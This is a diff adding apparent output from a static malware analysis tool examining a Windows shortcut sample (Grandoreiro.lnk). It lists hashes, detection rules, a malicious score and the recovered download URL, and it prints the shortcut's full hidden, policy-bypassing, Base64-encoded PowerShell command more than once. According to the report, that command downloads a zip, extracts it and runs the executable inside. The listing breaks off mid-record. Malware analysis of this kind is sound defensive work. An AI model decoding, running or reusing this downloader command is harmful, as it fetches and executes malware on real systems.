@@ -1,0 +1,570 @@
+
+╭──────────────────────────────────────────────────────────────────────────────────────────────────╮
+│  ThreatLens  Static Malware Analysis                                                             │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+
+                                          File Information                                          
+╭────────┬─────────────────────────────────────────────────────────────────────────────────────────╮
+│ File   │ Grandoreiro.lnk                                                                         │
+│ Path   │ /home/pmafma/Documents/Malware/lnk test malware/Grandoreiro.lnk                         │
+│ Size   │ 8.3 KiB                                                                                 │
+│ Type   │ MS Windows shortcut, Item id list present, Points to a file or directory, Has           │
+│        │ Description string, Has Relative path, Has Working directory, Has command line          │
+│        │ arguments, Icon number=2, Unicoded, HasExpIcon, Archive, ctime=Tue May  5 22:37:55      │
+│        │ 2026, atime=Thu Jun 11 16:56:01 2026, mtime=Tue May  5 22:37:55 2026, length=423424,    │
+│        │ window=showminnoactive, IDListSize 0x020d, Root folder                                  │
+│        │ "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath                     │
+│        │ "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"                             │
+│ MIME   │ application/x-ms-shortcut                                                               │
+│ MD5    │ d4cb7d7128133c5ed5f17a1f697b0410                                                        │
+│ SHA256 │ fee0824bcc6bc86c65ecfb522035e66a86842956eab83153eda141c20709b5f8                        │
+│ TLSH   │ T10A0205212CE710DDF2774B7527DCF9FB0AA6F4A5682D71B42041C6444BB0AD4DCA2EB5                │
+│ ssdeep │ 192:8p8eI1L2cMacvlkLFP6cDc/X/Jc1/CO7jN0/OVlccMvMhqecrYk0:XeIJ2cMacv6LFP6cDcPxc0ojN02Vlc │
+│        │ cR                                                                                      │
+╰────────┴─────────────────────────────────────────────────────────────────────────────────────────╯
+
+  █████████████░░░░░░░░░  60/100  HIGH
+
+  Likely malicious with powershell.exe launching encoded PowerShell, document icon disguising an 
+executable target, known malware-hosting infrastructure, built on host 'laptop-pp7fvpth'
+
+  FINDINGS
+                                                                                                    
+ Module           Δ   Reason                                                                        
+ ────────────────────────────────────────────────────────────────────────────────────────────────── 
+ lnk_analysis   +60   LOLBin target launching a Base64-encoded PowerShell command (+35); LOLBin     
+                      target fetching a remote URL (+28); Document icon in front of a LOLBin target 
+                      (MITRE T1027.012) (+25); Command line references known malware-hosting        
+                      infrastructure (+22); LOLBin target launched with a hidden window (+18);      
+                      LOLBin target with execution-policy or profile bypass flags (+16); Argument   
+                      string far longer than any legitimate shortcut carries (+15); Obfuscated      
+                      command line (+13); More than four command-line arguments (+6); Target is a   
+                      living-off-the-land binary (+5)                                               
+                                                                                                    
+
+  Windows Shortcut Indicators
+                                                                                                    
+ Classification    MALICIOUS                                                                        
+ Target            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                        
+ Arguments         -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand                      
+                   dAByAHkAIAB7ACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBl     
+                   AHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4A     
+                   UwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7     
+                   ACAAJAB1AHIAbAAgAD0AIAAkACgAJAB0AD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4A     
+                   YwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0     
+                   AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4A     
+                   ZwAoACIAYwBIAEIAcABhAFgAcAA2AEwAaQA1AHYAYgAzAEoAeQBjAEgAQgB6AGMAMgBWAGwAWQAy     
+                   AE4AdgBiADMASgB5AGMASABBAHYATAAzAE4AegBkAFgAVgBzAGIASABCAHcAWgBXAFYAdABiAFcA     
+                   OQB2AGEARwBnAHYATAAzAFIAMABaAFcAVgB1AGIAaQA0AHUAYwAzAE4AMwANAAoAZAAyADkAdgBa     
+                   AEcAUgB1AGIAbQBsAHAAZAAzAGMAdQBMAG0AVgBsAGMAbgBKAHYAYgAyAE4AagBMAGkANQBpAFkA     
+                   bQA5AHYAYgBHAHgAaQBZAGkANAB1AGMAbgBKAGwAWgBYAFoAMgBjADMATQAyAE4AagBJAHkATQBE     
+                   AEEAeQBNAGoATQB6AE0ARABBAHgATQBUAEUAeAANAAoATAB5ADgAdgBMAHoAbwA2AGMAMwBOAHcA     
+                   YwBIAFIAMABkAEgAUgBvAGEAQQA9AD0AIgApACkAOwAkAHIAPQAiACIAOwBmAG8AcgAoACQAaQA9     
+                   ADAAOwAkAGkALQBsAHQAJAB0AC4ATABlAG4AZwB0AGgAOwAkAGkAKwA9ADIAKQB7ACQAcgArAD0A     
+                   JAB0AFsAJABpAF0AfQA7AC0AagBvAGkAbgAoACQAcgBbACQAcgAuAEwAZQBuAGcAdABoAC4ALgAw     
+                   AF0AKQApADsAIAAkAHQAZQBtAHAAWgBpAHAAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAA     
+                   YQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABGAGkAbABlAE4AYQBtAGUAKAApACAAKwAgACIALgB6     
+                   AGkAcAAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAA     
+                   JAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAdABlAG0AcABaAGkAcAA7ACAAJABiAGEAcwBl     
+                   AEQAaQByACAAPQAgAFsAUwB5AHMAdABlAG0ALgBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoA     
+                   RQB4AHAAYQBuAGQARQBuAHYAaQByAG8AbgBtAGUAbgB0AFYAYQByAGkAYQBiAGwAZQBzACgAIgAl     
+                   AEwAbwBjAGEAbABBAHAAcABEAGEAdABhACUAIgApADsAIAAkAGUAeAB0AHIAYQBjAHQAUABhAHQA     
+                   aAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAYgBhAHMAZQBEAGkAcgAgACIARQB4AHQAcgBh     
+                   AGMAdABlAGQAXwAkACgARwBlAHQALQBSAGEAbgBkAG8AbQApACIAOwAgAE4AZQB3AC0ASQB0AGUA     
+                   bQAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAtAFAAYQB0AGgAIAAk     
+                   AGUAeAB0AHIAYQBjAHQAUABhAHQAaAAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwA     
+                   bAA7ACAARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAJAB0AGUAbQBw     
+                   AFoAaQBwACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgACQAZQB4AHQAcgBhAGMA     
+                   dABQAGEAdABoACAALQBGAG8AcgBjAGUAOwAgACQAZQB4AGUARgBpAGwAZQBzACAAPQAgAEcAZQB0     
+                   AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAGUAeAB0AHIAYQBjAHQAUABhAHQA     
+                   aAAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBlAHgAZQAiACAALQBSAGUAYwB1AHIAcwBlADsAIABp     
+                   AGYAIAAoACQAZQB4AGUARgBpAGwAZQBzACkAIAB7ACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIA     
+                   bwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAeABlAEYAaQBsAGUAcwBbADAAXQAu     
+                   AEYAdQBsAGwATgBhAG0AZQAgAC0AVwBvAHIAawBpAG4AZwBEAGkAcgBlAGMAdABvAHIAeQAgACQA     
+                   ZQB4AHQAcgBhAGMAdABQAGEAdABoADsAIAB9ACAAZQBsAHMAZQAgAHsAIAAgACAAIAAgAFcAcgBp     
+                   AHQAZQAtAEgAbwBzAHQAIAAiAE4AZQBuAGgAdQBtACAAYQByAHEAdQBpAHYAbwAgAC4AZQB4AGUA     
+                   IABlAG4AYwBvAG4AdAByAGEAZABvACAAbgBvACAAWgBJAFAAIgA7ACAAfQAgAH0AIABjAGEAdABj     
+                   AGgAIAB7ACAATwB1AHQALQBGAGkAbABlACAALQBGAGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYA     
+                   OgBUAEUATQBQAFwAbABuAGsAXwBlAHIAcgBvAHIALgB0AHgAdAAiACAALQBJAG4AcAB1AHQATwBi     
+                   AGoAZQBjAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAIAAtAEYA     
+                   bwByAGMAZQAgAH0A                                                                 
+ Argument length   3196 characters (46 tokens)                                                      
+ Working dir       C:\Windows\Temp                                                                  
+ Description       Document                                                                         
+ Icon masquerade   C:\Windows\System32\imageres.dll — document icon over an executable target       
+                   (T1027.012)                                                                      
+ Relative path     ..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (4 traversal  
+                   levels)                                                                          
+ Build machine     laptop-pp7fvpth                                                                  
+ Build MAC         c0:a5:e8:a3:0c:2c                                                                
+ Volume serial     B62FA171                                                                         
+ Pattern           Base64-encoded PowerShell command                                                
+ Pattern           Hidden window style                                                              
+ Pattern           ExecutionPolicy bypass                                                           
+ Deobfuscation     layers undone: base64 → base64 → reverse → de-double                             
+ Recovered IOC     https://11032026sver.blob.core.windows.net/homeplus/procespro.zip                
+ Recovered IOC     11032026sver.blob.core.windows.net                                               
+ Fired rule        LOLBin target launching a Base64-encoded PowerShell command (+35)                
+ Fired rule        LOLBin target fetching a remote URL (+28)                                        
+ Fired rule        Document icon in front of a LOLBin target (MITRE T1027.012) (+25)                
+ Fired rule        Command line references known malware-hosting infrastructure (+22)               
+ Fired rule        LOLBin target launched with a hidden window (+18)                                
+ Fired rule        LOLBin target with execution-policy or profile bypass flags (+16)                
+ Fired rule        Argument string far longer than any legitimate shortcut carries (+15)            
+ Fired rule        Obfuscated command line (+13)                                                    
+ Fired rule        More than four command-line arguments (+6)                                       
+ Fired rule        Target is a living-off-the-land binary (+5)                                      
+ Link flags        HasLinkTargetIDList, HasLinkInfo, HasName, HasRelativePath, HasWorkingDir,       
+                   HasArguments, HasIconLocation, IsUnicode, HasExpIcon                             
+ File attributes   ARCHIVE                                                                          
+ Extra blocks      IconEnvironmentDataBlock, SpecialFolderDataBlock, KnownFolderDataBlock,          
+                   TrackerDataBlock, PropertyStoreDataBlock                                         
+ Show command      SW_SHOWMINNOACTIVE                                                               
+ Created           2026-05-06T00:37:55.425400+00:00                                                 
+ Accessed          2026-06-11T18:56:01.055906+00:00                                                 
+ Modified          2026-05-06T00:37:55.425400+00:00                                                 
+ Target size       423424 bytes                                                                     
+ Flag              args_over_1024_chars                                                             
+ Flag              encoded_powershell                                                               
+ Flag              exec_bypass                                                                      
+ Flag              has_arguments                                                                    
+ Flag              hidden_window                                                                    
+ Flag              icon_masquerade                                                                  
+ Flag              lolbin_target                                                                    
+ Flag              many_arguments                                                                   
+ Flag              obfuscation                                                                      
+ Flag              remote_url_in_args                                                               
+ Flag              suspicious_host                                                                  
+                                                                                                    
+
+                                        Shell Items (IDList)                                        
+╭───┬─────────────┬────────────────────────────────────────┬───────────┬─────┬─────────────────────╮
+│ # │ Type        │ Name                                   │ MFT entry │ Seq │ Modified            │
+├───┼─────────────┼────────────────────────────────────────┼───────────┼─────┼─────────────────────┤
+│ 0 │ root folder │ {20d04fe0-3aea-1069-a2d8-08002b30309d} │         - │   - │ -                   │
+│ 1 │ volume      │ C:\                                    │         - │   - │ -                   │
+│ 2 │ file entry  │ Windows                                │    795758 │  14 │ 2026-06-10T20:30:02 │
+│ 3 │ file entry  │ System32                               │    799129 │  14 │ 2026-06-10T20:36:42 │
+│ 4 │ file entry  │ WindowsPowerShell                      │    806333 │  16 │ 2024-04-01T07:26:08 │
+│ 5 │ file entry  │ v1.0                                   │    806334 │  15 │ 2026-05-06T00:39:36 │
+│ 6 │ file entry  │ powershell.exe                         │   1089582 │   2 │ 2026-05-06T00:37:56 │
+╰───┴─────────────┴────────────────────────────────────────┴───────────┴─────┴─────────────────────╯
+
+                                        Property Store                                         
+╭────────────────────────────────────────────┬────────────────────────────────────────────────╮
+│ Property                                   │ Value                                          │
+├────────────────────────────────────────────┼────────────────────────────────────────────────┤
+│ {46588ae2-4cbc-4338-bbfc-139326986dce}/4   │ S-1-5-21-4018316176-2930928383-3956032897-1003 │
+│ {446d16b1-8dad-4870-a748-402ea43d788c}/104 │ f8b8edc4-61a1-4e7e-ad84-0a0d2007a978           │
+╰────────────────────────────────────────────┴────────────────────────────────────────────────╯
+
+                                           Module Results                                           
+╭──────────────┬─────────┬─────────┬───────────────────────────────────────────────────────────────╮
+│ Module       │ Status  │ Score Δ │ Reason                                                        │
+├──────────────┼─────────┼─────────┼───────────────────────────────────────────────────────────────┤
+│ file_intake  │ success │       — │ File intake provides metadata only — no score contribution.   │
+│ lnk_analysis │ success │     +60 │ LOLBin target launching a Base64-encoded PowerShell command   │
+│              │         │         │ (+35); LOLBin target fetching a remote URL (+28); Document    │
+│              │         │         │ icon in front of a LOLBin target (MITRE T1027.012) (+25);     │
+│              │         │         │ Command line references known malware-hosting infrastructure  │
+│              │         │         │ (+22); LOLBin target launched with a hidden window (+18);     │
+│              │         │         │ LOLBin target with execution-policy or profile bypass flags   │
+│              │         │         │ (+16); Argument string far longer than any legitimate         │
+│              │         │         │ shortcut carries (+15); Obfuscated command line (+13); More   │
+│              │         │         │ than four command-line arguments (+6); Target is a            │
+│              │         │         │ living-off-the-land binary (+5)                               │
+╰──────────────┴─────────┴─────────┴───────────────────────────────────────────────────────────────╯
+
+╭───────────────────────────────────── Recommended Next Steps ─────────────────────────────────────╮
+│                                                                                                  │
+│    • Consider dynamic analysis — set dynamic_provider in config.yaml                             │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+
+  RAW MODULE DATA
+
+  file_intake (success)
+{
+  "module": "file_intake",
+  "status": "success",
+  "data": {
+    "file_name": "Grandoreiro.lnk",
+    "file_path": "/home/pmafma/Documents/Malware/lnk test malware/Grandoreiro.lnk",
+    "file_size": 8497,
+    "hashes": {
+      "md5": "d4cb7d7128133c5ed5f17a1f697b0410",
+      "sha256": "fee0824bcc6bc86c65ecfb522035e66a86842956eab83153eda141c20709b5f8",
+      "tlsh": "T10A0205212CE710DDF2774B7527DCF9FB0AA6F4A5682D71B42041C6444BB0AD4DCA2EB5",
+      "ssdeep": 
+"192:8p8eI1L2cMacvlkLFP6cDc/X/Jc1/CO7jN0/OVlccMvMhqecrYk0:XeIJ2cMacv6LFP6cDcPxc0ojN02VlccR"
+    },
+    "file_type": {
+      "mime_type": "application/x-ms-shortcut",
+      "description": "MS Windows shortcut, Item id list present, Points to a file or directory, Has 
+Description string, Has Relative path, Has Working directory, Has command line arguments, Icon 
+number=2, Unicoded, HasExpIcon, Archive, ctime=Tue May  5 22:37:55 2026, atime=Thu Jun 11 16:56:01 
+2026, mtime=Tue May  5 22:37:55 2026, length=423424, window=showminnoactive, IDListSize 0x020d, Root
+folder \"20D04FE0-3AEA-1069-A2D8-08002B30309D\", Volume \"C:\\\", LocalBasePath 
+\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\""
+    }
+  },
+  "score_delta": 0,
+  "reason": "File intake provides metadata only \u2014 no score contribution."
+}
+
+  lnk_analysis (success)
+{
+  "module": "lnk_analysis",
+  "status": "success",
+  "data": {
+    "valid_magic": true,
+    "classification": "MALICIOUS",
+    "fired_rules": [
+      "LOLBin target launching a Base64-encoded PowerShell command (+35)",
+      "LOLBin target fetching a remote URL (+28)",
+      "Document icon in front of a LOLBin target (MITRE T1027.012) (+25)",
+      "Command line references known malware-hosting infrastructure (+22)",
+      "LOLBin target launched with a hidden window (+18)",
+      "LOLBin target with execution-policy or profile bypass flags (+16)",
+      "Argument string far longer than any legitimate shortcut carries (+15)",
+      "Obfuscated command line (+13)",
+      "More than four command-line arguments (+6)",
+      "Target is a living-off-the-land binary (+5)"
+    ],
+    "indicator_flags": [
+      "args_over_1024_chars",
+      "encoded_powershell",
+      "exec_bypass",
+      "has_arguments",
+      "hidden_window",
+      "icon_masquerade",
+      "lolbin_target",
+      "many_arguments",
+      "obfuscation",
+      "remote_url_in_args",
+      "suspicious_host"
+    ],
+    "anomalies": [],
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "target_source": "link_info",
+    "target_basename": "powershell.exe",
+    "is_lolbin": true,
+    "target_disagreement": false,
+    "arguments": "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand 
+dAByAHkAIAB7ACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBl\r\nAHIAXQA6ADoAUwBlAGMA
+dQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4A\r\nUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8A
+bABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7\r\nACAAJAB1AHIAbAAgAD0AIAAkACgAJAB0AD0AWwBTAHkAcwB0AGUAbQAuAFQA
+ZQB4AHQALgBFAG4A\r\nYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0\r\n
+AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4A\r\nZwAoACIAYwBIAEIAcABh
+AFgAcAA2AEwAaQA1AHYAYgAzAEoAeQBjAEgAQgB6AGMAMgBWAGwAWQAy\r\nAE4AdgBiADMASgB5AGMASABBAHYATAAzAE4AegBk
+AFgAVgBzAGIASABCAHcAWgBXAFYAdABiAFcA\r\nOQB2AGEARwBnAHYATAAzAFIAMABaAFcAVgB1AGIAaQA0AHUAYwAzAE4AMwAN
+AAoAZAAyADkAdgBa\r\nAEcAUgB1AGIAbQBsAHAAZAAzAGMAdQBMAG0AVgBsAGMAbgBKAHYAYgAyAE4AagBMAGkANQBpAFkA\r\n
+bQA5AHYAYgBHAHgAaQBZAGkANAB1AGMAbgBKAGwAWgBYAFoAMgBjADMATQAyAE4AagBJAHkATQBE\r\nAEEAeQBNAGoATQB6AE0A
+RABBAHgATQBUAEUAeAANAAoATAB5ADgAdgBMAHoAbwA2AGMAMwBOAHcA\r\nYwBIAFIAMABkAEgAUgBvAGEAQQA9AD0AIgApACkA
+OwAkAHIAPQAiACIAOwBmAG8AcgAoACQAaQA9\r\nADAAOwAkAGkALQBsAHQAJAB0AC4ATABlAG4AZwB0AGgAOwAkAGkAKwA9ADIA
+KQB7ACQAcgArAD0A\r\nJAB0AFsAJABpAF0AfQA7AC0AagBvAGkAbgAoACQAcgBbACQAcgAuAEwAZQBuAGcAdABoAC4ALgAw\r\n
+AF0AKQApADsAIAAkAHQAZQBtAHAAWgBpAHAAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAA\r\nYQB0AGgAXQA6ADoARwBl
+AHQAVABlAG0AcABGAGkAbABlAE4AYQBtAGUAKAApACAAKwAgACIALgB6\r\nAGkAcAAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBi
+AFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAA\r\nJAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAdABlAG0AcABaAGkAcAA7
+ACAAJABiAGEAcwBl\r\nAEQAaQByACAAPQAgAFsAUwB5AHMAdABlAG0ALgBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoA\r\n
+RQB4AHAAYQBuAGQARQBuAHYAaQByAG8AbgBtAGUAbgB0AFYAYQByAGkAYQBiAGwAZQBzACgAIgAl\r\nAEwAbwBjAGEAbABBAHAA
+cABEAGEAdABhACUAIgApADsAIAAkAGUAeAB0AHIAYQBjAHQAUABhAHQA\r\naAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQA
+YgBhAHMAZQBEAGkAcgAgACIARQB4AHQAcgBh\r\nAGMAdABlAGQAXwAkACgARwBlAHQALQBSAGEAbgBkAG8AbQApACIAOwAgAE4A
+ZQB3AC0ASQB0AGUA\r\nbQAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAtAFAAYQB0AGgAIAAk\r\n
+AGUAeAB0AHIAYQBjAHQAUABhAHQAaAAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwA\r\nbAA7ACAARQB4AHAAYQBu
+AGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAJAB0AGUAbQBw\r\nAFoAaQBwACAALQBEAGUAcwB0AGkAbgBhAHQAaQBv
+AG4AUABhAHQAaAAgACQAZQB4AHQAcgBhAGMA\r\ndABQAGEAdABoACAALQBGAG8AcgBjAGUAOwAgACQAZQB4AGUARgBpAGwAZQBz
+ACAAPQAgAEcAZQB0\r\nAC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAGUAeAB0AHIAYQBjAHQAUABhAHQA\r\n
+aAAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBlAHgAZQAiACAALQBSAGUAYwB1AHIAcwBlADsAIABp\r\nAGYAIAAoACQAZQB4AGUA
+RgBpAGwAZQBzACkAIAB7ACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIA\r\nbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgA
+IAAkAGUAeABlAEYAaQBsAGUAcwBbADAAXQAu\r\nAEYAdQBsAGwATgBhAG0AZQAgAC0AVwBvAHIAawBpAG4AZwBEAGkAcgBlAGMA
+dABvAHIAeQAgACQA\r\nZQB4AHQAcgBhAGMAdABQAGEAdABoADsAIAB9ACAAZQBsAHMAZQAgAHsAIAAgACAAIAAgAFcAcgBp\r\n
+AHQAZQAtAEgAbwBzAHQAIAAiAE4AZQBuAGgAdQBtACAAYQByAHEAdQBpAHYAbwAgAC4AZQB4AGUA\r\nIABlAG4AYwBvAG4AdABy
+AGEAZABvACAAbgBvACAAWgBJAFAAIgA7ACAAfQAgAH0AIABjAGEAdABj\r\nAGgAIAB7ACAATwB1AHQALQBGAGkAbABlACAALQBG
+AGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYA\r\nOgBUAEUATQBQAFwAbABuAGsAXwBlAHIAcgBvAHIALgB0AHgAdAAiACAALQBJ
+AG4AcAB1AHQATwBi\r\nAGoAZQBjAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAIAAtAEYA\r\n
+bwByAGMAZQAgAH0A",
+    "arguments_length": 3196,
+    "argument_count": 46,
+    "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle 
+Hidden -ExecutionPolicy Bypass -EncodedCommand 
+dAByAHkAIAB7ACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBl\r\nAHIAXQA6ADoAUwBlAGMA
+dQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4A\r\nUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8A
+bABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7\r\nACAAJAB1AHIAbAAgAD0AIAAkACgAJAB0AD0AWwBTAHkAcwB0AGUAbQAuAFQA
+ZQB4AHQALgBFAG4A\r\nYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0\r\n
+AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4A\r\nZwAoACIAYwBIAEIAcABh
+AFgAcAA2AEwAaQA1AHYAYgAzAEoAeQBjAEgAQgB6AGMAMgBWAGwAWQAy\r\nAE4AdgBiADMASgB5AGMASABBAHYATAAzAE4AegBk
+AFgAVgBzAGIASABCAHcAWgBXAFYAdABiAFcA\r\nOQB2AGEARwBnAHYATAAzAFIAMABaAFcAVgB1AGIAaQA0AHUAYwAzAE4AMwAN
+AAoAZAAyADkAdgBa\r\nAEcAUgB1AGIAbQBsAHAAZAAzAGMAdQBMAG0AVgBsAGMAbgBKAHYAYgAyAE4AagBMAGkANQBpAFkA\r\n
+bQA5AHYAYgBHAHgAaQBZAGkANAB1AGMAbgBKAGwAWgBYAFoAMgBjADMATQAyAE4AagBJAHkATQBE\r\nAEEAeQBNAGoATQB6AE0A
+RABBAHgATQBUAEUAeAANAAoATAB5ADgAdgBMAHoAbwA2AGMAMwBOAHcA\r\nYwBIAFIAMABkAEgAUgBvAGEAQQA9AD0AIgApACkA
+OwAkAHIAPQAiACIAOwBmAG8AcgAoACQAaQA9\r\nADAAOwAkAGkALQBsAHQAJAB0AC4ATABlAG4AZwB0AGgAOwAkAGkAKwA9ADIA
+KQB7ACQAcgArAD0A\r\nJAB0AFsAJABpAF0AfQA7AC0AagBvAGkAbgAoACQAcgBbACQAcgAuAEwAZQBuAGcAdABoAC4ALgAw\r\n
+AF0AKQApADsAIAAkAHQAZQBtAHAAWgBpAHAAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAA\r\nYQB0AGgAXQA6ADoARwBl
+AHQAVABlAG0AcABGAGkAbABlAE4AYQBtAGUAKAApACAAKwAgACIALgB6\r\nAGkAcAAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBi
+AFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAA\r\nJAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAdABlAG0AcABaAGkAcAA7
+ACAAJABiAGEAcwBl\r\nAEQAaQByACAAPQAgAFsAUwB5AHMAdABlAG0ALgBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoA\r\n
+RQB4AHAAYQBuAGQARQBuAHYAaQByAG8AbgBtAGUAbgB0AFYAYQByAGkAYQBiAGwAZQBzACgAIgAl\r\nAEwAbwBjAGEAbABBAHAA
+cABEAGEAdABhACUAIgApADsAIAAkAGUAeAB0AHIAYQBjAHQAUABhAHQA\r\naAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQA
+YgBhAHMAZQBEAGkAcgAgACIARQB4AHQAcgBh\r\nAGMAdABlAGQAXwAkACgARwBlAHQALQBSAGEAbgBkAG8AbQApACIAOwAgAE4A
+ZQB3AC0ASQB0AGUA\r\nbQAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAtAFAAYQB0AGgAIAAk\r\n
+AGUAeAB0AHIAYQBjAHQAUABhAHQAaAAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwA\r\nbAA7ACAARQB4AHAAYQBu
+AGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAJAB0AGUAbQBw\r\nAFoAaQBwACAALQBEAGUAcwB0AGkAbgBhAHQAaQBv
+AG4AUABhAHQAaAAgACQAZQB4AHQAcgBhAGMA\r\ndABQAGEAdABoACAALQBGAG8AcgBjAGUAOwAgACQAZQB4AGUARgBpAGwAZQBz
+ACAAPQAgAEcAZQB0\r\nAC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAGUAeAB0AHIAYQBjAHQAUABhAHQA\r\n
+aAAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBlAHgAZQAiACAALQBSAGUAYwB1AHIAcwBlADsAIABp\r\nAGYAIAAoACQAZQB4AGUA
+RgBpAGwAZQBzACkAIAB7ACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIA\r\nbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgA
+IAAkAGUAeABlAEYAaQBsAGUAcwBbADAAXQAu\r\nAEYAdQBsAGwATgBhAG0AZQAgAC0AVwBvAHIAawBpAG4AZwBEAGkAcgBlAGMA
+dABvAHIAeQAgACQA\r\nZQB4AHQAcgBhAGMAdABQAGEAdABoADsAIAB9ACAAZQBsAHMAZQAgAHsAIAAgACAAIAAgAFcAcgBp\r\n
+AHQAZQAtAEgAbwBzAHQAIAAiAE4AZQBuAGgAdQBtACAAYQByAHEAdQBpAHYAbwAgAC4AZQB4AGUA\r\nIABlAG4AYwBvAG4AdABy
+AGEAZABvACAAbgBvACAAWgBJAFAAIgA7ACAAfQAgAH0AIABjAGEAdABj\r\nAGgAIAB7ACAATwB1AHQALQBGAGkAbABlACAALQBG
+AGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYA\r\nOgBUAEUATQBQAFwAbABuAGsAXwBlAHIAcgBvAHIALgB0AHgAdAAiACAALQBJ
+AG4AcAB1AHQATwBi\r\nAGoAZQBjAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAIAAtAEYA\r\n
+bwByAGMAZQAgAH0A",
+    "working_dir": "C:\\Windows\\Temp",
+    "name_string": "Document",
+    "relative_path": "..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "icon_location": "C:\\Windows\\System32\\imageres.dll",
